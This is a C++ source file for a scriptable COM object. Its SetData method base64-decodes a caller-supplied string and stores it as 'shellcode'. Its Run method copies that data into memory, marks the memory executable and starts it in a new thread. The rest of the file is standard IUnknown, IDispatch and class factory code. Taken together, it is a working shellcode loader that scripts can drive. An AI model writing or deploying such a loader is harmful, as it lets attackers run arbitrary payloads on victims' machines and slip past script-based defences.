#include "object.h"
#include <iostream>

HMODULE TestClassFactory::s_hModule = NULL;

HRESULT __stdcall TestClass::SetData(wchar_t* data) {
    std::wstring wide = std::wstring(data);
    std::string base64;
    std::string decoded;

    base64 = ws2s(wide);   
    Base64Decode(base64, &decoded);
    shellcode = decoded;

    return S_OK;
}

HRESULT __stdcall TestClass::Run() {
    DWORD old;
    SIZE_T shellcodeSize = (SIZE_T)shellcode.length();
    PVOID pShellcode = LocalAlloc(LPTR, shellcodeSize);
    CopyMemory(pShellcode, shellcode.c_str(), shellcodeSize);
    if (!VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return S_OK;
}

// IUnknown
ULONG __stdcall TestClass::AddRef() {
    return InterlockedIncrement(&m_cRef);
}

ULONG __stdcall TestClass::Release() {
    ULONG nRefCount = 0;
    nRefCount = InterlockedDecrement(&m_cRef);
    if (nRefCount == 0) {
        delete this;
        return 0;
    }
    return m_cRef;
}

HRESULT __stdcall TestClass::QueryInterface(REFIID riid, void** ppv) {
    if (riid == IID_IUnknown) {
        *ppv = (IUnknown*)this;
    }
    else if (riid == IID_ITestClass) {
        *ppv = (ITestClass*)this;
    }
    else if (riid == IID_IDispatch) {
        *ppv = (IDispatch*)this;
    }
    else {
        *ppv = NULL;
        return E_NOINTERFACE;
    }
    AddRef();
    return S_OK;
}

// IDispatch
HRESULT __stdcall TestClass::GetTypeInfoCount(UINT* pctinfo) {
    *pctinfo = 1;

    return S_OK;
}

HRESULT __stdcall TestClass::GetTypeInfo(UINT iTypeInfo, LCID, ITypeInfo** ppTypeInfo) {
    *ppTypeInfo = NULL;

    if (iTypeInfo != 0)
    {
        return DISP_E_BADINDEX;
    }

    // Call AddRef and return the pointer.
    m_pITypeInfo->AddRef();
    *ppTypeInfo = m_pITypeInfo;

    return S_OK;
}

HRESULT __stdcall TestClass::GetIDsOfNames(REFIID riid, LPOLESTR* rgszNames, UINT cNames, LCID, DISPID* rgDispId) {
    if (riid != IID_NULL)
        return DISP_E_UNKNOWNINTERFACE;

    HRESULT hr = m_pITypeInfo->GetIDsOfNames(rgszNames, cNames, rgDispId);

    return hr;
}

HRESULT __stdcall TestClass::Invoke(DISPID dispIdMember, REFIID riid, LCID, WORD wFlags, DISPPARAMS* pDispParams, VARIANT* pVarResult, EXCEPINFO* pExcepInfo, UINT* puArgErr) {
    if (riid != IID_NULL)
        return DISP_E_UNKNOWNINTERFACE;

    HRESULT hr = m_pITypeInfo->Invoke(
        static_cast<IDispatch*>(this), dispIdMember, wFlags, pDispParams, pVarResult, pExcepInfo, puArgErr);

    return hr;
}

//
// TestClassFactory
//

ULONG __stdcall TestClassFactory::AddRef() {
    return ++m_cRef;
}

ULONG __stdcall TestClassFactory::Release() {
    if (--m_cRef != 0)
        return m_cRef;
    delete this;
    return 0;
}

HRESULT __stdcall TestClassFactory::QueryInterface(REFIID riid, void** ppv) {

    if (riid == IID_IUnknown) {
        *ppv = (IUnknown*)this;
    }
    else if (riid == IID_ITestClass) {
        *ppv = (ITestClass*)this;
    }
    else if (riid == IID_IClassFactory) {
        *ppv = (IClassFactory*)this;
    }
    else {
        *ppv = NULL;
        return E_NOINTERFACE;
    }
    AddRef();
    return S_OK;
}

HRESULT __stdcall TestClassFactory::CreateInstance(IUnknown* pUnknownOuter, const IID& iid, void** ppv) {
    wchar_t* a;
    StringFromIID(iid, &a);
    if (pUnknownOuter != NULL)
        return CLASS_E_NOAGGREGATION;

    TestClass* testClass = new TestClass;
    if (testClass == NULL)
        return E_OUTOFMEMORY;
    HRESULT hr = testClass->Init();
    if (FAILED(hr)) {
        testClass->Release();
        return hr;
    }
    hr = testClass->QueryInterface(iid, ppv);
    testClass->Release();
    return hr;
}

HRESULT __stdcall TestClassFactory::LockServer(BOOL bLock) {
    return E_NOTIMPL;
}

// Helper to initialize our Type Library
HRESULT __stdcall TestClass::Init() {
    HRESULT hr;

    // Load TypeInfo on demand if we haven't already loaded it.
    if (m_pITypeInfo == NULL)
    {
        ITypeLib* pITypeLib = NULL;
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(TestClassFactory::s_hModule, path, MAX_PATH);
        hr = LoadTypeLibEx(path, REGKIND_NONE, &pITypeLib);
        if (FAILED(hr))
        {
            return hr;
        }

        // Get type information for the interface of the object.
        hr = pITypeLib->GetTypeInfoOfGuid(IID_ITestClass, &m_pITypeInfo);
        pITypeLib->Release();

        if (FAILED(hr))
        {
            return hr;
        }
    }

    return S_OK;
}
